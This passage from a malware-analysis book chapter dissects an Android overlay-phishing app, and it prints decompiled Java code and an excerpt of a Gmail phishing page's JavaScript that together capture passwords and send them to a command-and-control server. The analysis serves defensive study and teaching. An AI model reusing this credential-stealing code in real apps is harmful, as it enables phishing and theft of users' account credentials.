<p class="list" id="ch4lis28"><em>Listing 4-28: The phishing window uses a WebView to show the phishing pages.</em></p>&#13;
<p class="indent">When this dialog is shown, it loads the phishing page’s HTML code into a WebView and shows it to the user. The <span class="literal">getPageResource</span> method fetches HTML that has been customized for the target.</p>&#13;
<h4 class="h4" id="ch04lev1sec29"><strong><em>Stealing Credentials</em></strong></h4>&#13;
<p class="noindent">Lastly, to understand how the app steals credentials, we need to know how the credentials entered by the user travel from the HTML page in the WebView to the app and how the app sends them to its command-and-control server.</p>&#13;
<p class="indent">A JavaScript interface serves as a bridge between the website and the app. As you saw in <a href="ch04.xhtml#ch4lis28">Listing 4-28</a>, the interface is based on a Java class named <span class="literal">WebAppInterface</span> that is exposed to the website as a JavaScript object of name <span class="literal">Android</span>. <a href="ch04.xhtml#ch4lis29">Listing 4-29</a> shows the complete <span class="literal">WebAppInterface</span> class.</p>&#13;
<pre>public static class WebAppInterface {&#13;
    OverlayInjectActivity parent;&#13;
&#13;
    WebAppInterface(OverlayInjectActivity overlayInjectActivity) {&#13;
        this.parent = overlayInjectActivity;&#13;
    }&#13;
&#13;
    @JavascriptInterface&#13;
    public void send_log_injects(String str) {&#13;
        returnResult(str);&#13;
    }&#13;
&#13;
    @JavascriptInterface&#13;
    <span epub:type="pagebreak" id="page_156"/>public void returnResult(String str) {&#13;
        new ApiOperationController().sendRequest(&#13;
            this.parent,&#13;
            new ApiInjectionSuccessRequestPayload(&#13;
                "inj_success",&#13;
                new ApiInjectionSuccess(&#13;
                    UtilGlobal.SettingsRead(&#13;
                        this.parent, Constants.appInjectTag),&#13;
                    str)&#13;
            ),&#13;
        true);&#13;
        OverlayInjectActivity overlayInjectActivity = this.parent;&#13;
        UtilGlobal.flagPackageInjectionIgnored(&#13;
            overlayInjectActivity, overlayInjectActivity.resource.id);&#13;
        this.parent.finish();&#13;
    }&#13;
}</pre>&#13;
<p class="list" id="ch4lis29"><em>Listing 4-29: The</em> <span class="codeitalic1">WebAppInterface</span> <em>class bridges the app and the phishing page.</em></p>&#13;
<p class="indent">The class defines two methods marked with the annotation <span class="literal">@JavascriptInterface</span>, which makes them available to the HTML page’s JavaScript code. The <span class="literal">send_log_injects</span> method simply calls the more interesting method, <span class="literal">returnResult</span>. When the app receives the stolen credentials, it issues a new command-and-control message of type <span class="literal">inj_success</span> that sends the stolen credentials to the server.</p>&#13;
<p class="indent">Taking a look at an example HTML page, such as the one for phishing Gmail account information, makes this interaction easier to understand. <a href="ch04.xhtml#ch4lis30">Listing 4-30</a> shows an excerpt from the phishing page, which takes form input from the user, turns it into a JSON string, and sends it to the app.</p>&#13;
<pre>&lt;body&gt;&#13;
    &lt;div id="googlemail" style="display: none;"&gt;&#13;
    ...&#13;
    &lt;input class="googlelogininput" id="passwordinput"&#13;
           type="password" name="password" placeholder="Password"&gt;&#13;
&#13;
    &lt;div class="linktext forgotemail"&gt;Forgot password?&lt;/div&gt;&#13;
    &lt;div class="spacer"&gt;&lt;/div&gt;&#13;
    &lt;button class="button" onclick="checkPassword();"&gt;Next&lt;/button&gt;&#13;
    ...&#13;
&lt;/body&gt;&#13;
&#13;
function checkPassword() {&#13;
    if(document.getElementById('passwordinput').value.length &gt; 5) {&#13;
        process('googlemail');&#13;
    }&#13;
}&#13;
&#13;
<span epub:type="pagebreak" id="page_157"/>function process(formId) {&#13;
    var ua = navigator.userAgent.toLowerCase();&#13;
    if(ua.indexOf("android") &gt; -1) {&#13;
        try {&#13;
            Android.send_log_injects(formToJSONbyName(&#13;
                document.getElementById(formId)));&#13;
        } catch (err) {}&#13;
    }else{&#13;
        alert(formToJSONbyName(document.getElementById(formId)));&#13;
    }&#13;
}</pre>&#13;
<p class="list" id="ch4lis30"><em>Listing 4-30: Excerpt of the HTML code for the Gmail phishing page</em></p>&#13;
<p class="indent">The HTML page defines an input form with a password field and a button. When the user clicks the button, the JavaScript method <span class="literal">checkPassword</span> is called to perform a quick password plausibility check. Then, <span class="literal">checkPassword</span> calls the <span class="literal">process</span> method, which serializes the input form into a JSON object and sends that to the Java code of the app through the JavaScript interface method <span class="literal">Android.send_log_injects</span>. The Java code of the app then sends the JSON string to the server to complete the password theft operation. At this point, the user has fallen for the phishing attack and the malware has achieved its goal.</p>&#13;
<h3 class="h3" id="ch04lev12"><strong>Up Next</strong></h3>&#13;
<p class="noindent">After following the analysis steps in this chapter, you should understand the malware’s main functionality. It waits until a target application is running and then creates an overlay window over the legitimate app, imitating the app’s user interface and asking the user to log in. The credentials the user enters into the dialog are then stolen. This is facilitated by abuse of the accessibility API and orchestrated by a command-and-control server.</p>&#13;
<p class="indent">This chapter should have also demonstrated the value of dynamic analysis. Using just a few tools, ranging from simple log analysis to powerful Frida scripts, we were able to make rapid progress in our analysis. We successfully discovered most of the malware’s functionality and developed a high-level understanding of how it works. Then we used static analysis to complement our understanding of details that are elusive to pure dynamic analysis.</p>&#13;
<p class="indent">In the remainder of this book, we’ll transition away from the manual analysis of individual malware samples to using machine learning as a means of quickly identifying and classifying numerous malicious apps. There are millions of malware samples floating around the internet today, and human analysts will look at very, very few of these. Instead, defenders will identify the vast majority of them through automated means. In that sense, the next few chapters of the book more accurately describe how professional malware detection and analysis works.<span epub:type="pagebreak" id="page_158"/></p>&#13;
</div>
</div>
<div style="float: none; margin: 10px 0px 10px 0px; text-align: center;"><p><a href="https://oceanofpdf.com"><i>OceanofPDF.com</i></a></p></div></body></html>